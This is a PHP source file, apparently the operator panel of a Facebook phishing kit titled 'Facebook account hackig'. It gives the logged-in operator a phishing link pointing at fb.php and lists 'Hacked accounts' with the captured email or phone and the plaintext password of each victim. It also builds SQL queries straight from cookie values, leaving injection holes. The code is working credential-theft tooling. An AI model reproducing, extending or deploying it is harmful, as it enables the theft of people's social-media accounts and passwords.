<?php

if (isset($_COOKIE['user']))
	{
		
				
	$user= $_COOKIE['user'];
		$pass= $_COOKIE['pass'];
		
		$host = "localhost";
		$dbuser = "root";
		$dbpass = "";
		$dbname = "bdh";
		$query = "select id from login
					where user='$user'";
					
			$qu="select name from login
					where user='$user'";
		
		$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);
	$sq = "select * from $user";
					
				
				$q=mysqli_query($conn, $qu)
						or die("");
					
		$d=mysqli_query($conn, $query)
						or die("");
			
			$rs=mysqli_query($conn, $sq)
				or die("");
				$rk=mysqli_query($conn, $sq)
				or die("");
						
echo '		
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Facebook account hackig</title>
	<style>
	body{
	color:red;
		background-color:black;
		
	}
		.sec{
		height:40vh;
		
	}
	.log{
	color:#f00;
	
	}
	p{
	font-size:16px;
	}
	#wraper{
		position:absolute;
		left:50%;
		top:30%;
		transform:translate(-50%,-50%);
	}
	
	.frm #d{
		
		display:inline-block;
		margin-left:auto;
		matgin-right:auto;
		padding:2px;
		margin-top:2px;
	}
	.frm{
		text-align:center;
	}
	.frm #c{
		
		display:inline-block;
		margin-left:auto;
		matgin-right:auto;	
		padding:5px;
			margin-bottom:2px;
	}
	a{
		float:right;
		margin-right:10px;
	
		text-decoration:none;
		font-size:16px;
		color:red;
	}
	
	
	
	</style>
	<script>function cf() {
 
  var copyText = document.getElementById("c");
  
  copyText.select();
  copyText.setSelectionRange(0, 99999);

  document.execCommand("copy");

  alert("Link copied: " + copyText.value);
}
 </script>
</head>
<body>
	<section class="sec">
	<div class="log">
	<p>Logged in as (';

while($j=mysqli_fetch_assoc($q)){
			extract ($j);
			
		echo $name;} echo ')</p>
	<a href="logout.php">Log out</a>
	</div>
	<div id="wraper">
	<form class="frm">
	<label for="" style="float:left;">Your link:</label>
			<input type="text" value="192.168.0.108/pr/fb.php?i=' ;
			
		while($i=mysqli_fetch_assoc($d)){
			extract ($i);
			$iid=$id+50;
		echo $iid;} echo '"id="c"></br>
		<button onclick="cf()" id="d">Copy link</button>
		</form>
	</div>	
	</section>
	<div class="list"><P>Hacked accounts:</p>
	<hr>';
	
	
				
			
			while ($row=mysqli_fetch_assoc($rs))
		{
			extract ($row);
			echo "</br>Email or phone: $mobile </br></br>";
			echo "Password: $password" ;
			echo '</br></br><hr>';
		}
		$ro=mysqli_num_rows($rk);
		if($ro==0){
			echo"No account hacked yet.";
		}
		
	echo'
	</div>
	
</body>
	</html>';}
	else{
	header('location:login.php');
	}
	
?>